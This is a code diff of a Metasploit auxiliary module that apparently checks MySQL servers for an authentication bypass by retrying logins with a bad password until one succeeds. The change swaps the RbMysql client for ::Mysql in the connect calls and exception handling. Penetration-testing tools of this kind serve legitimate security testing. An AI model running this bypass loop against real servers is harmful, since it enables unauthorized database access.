@@ -61,15 +61,15 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       socket = connect(false)
-      mysql_client = ::RbMysql.connect(rhost, username, password, nil, rport, socket)
+      mysql_client = ::Mysql.connect(rhost, username, password, nil, rport, io: socket)
       results << mysql_client
 
       print_good "#{rhost}:#{rport} The server accepted our first login as #{username} with a bad password. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
 
-    rescue RbMysql::HostNotPrivileged
+    rescue ::Mysql::HostNotPrivileged
       print_error "#{rhost}:#{rport} Unable to login from this host due to policy (may still be vulnerable)"
       return
-    rescue RbMysql::AccessDeniedError
+    rescue ::Mysql::AccessDeniedError
       print_good "#{rhost}:#{rport} The server allows logins, proceeding with bypass test"
     rescue ::Interrupt
       raise $!
@@ -113,11 +113,11 @@ class MetasploitModule < Msf::Auxiliary
           begin
             # Create our socket and make the connection
             s = connect(false)
-            mysql_client = ::RbMysql.connect(rhost, username, password, nil, rport, s)
+            mysql_client = ::Mysql.connect(rhost, username, password, nil, rport, io: s)
 
             print_good "#{rhost}:#{rport} Successfully bypassed authentication after #{count} attempts. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
             results << mysql_client
-          rescue RbMysql::AccessDeniedError
+          rescue ::Mysql::AccessDeniedError
           rescue ::Exception => e
             print_bad "#{rhost}:#{rport} Thread #{count}] caught an unhandled exception: #{e}"
           end
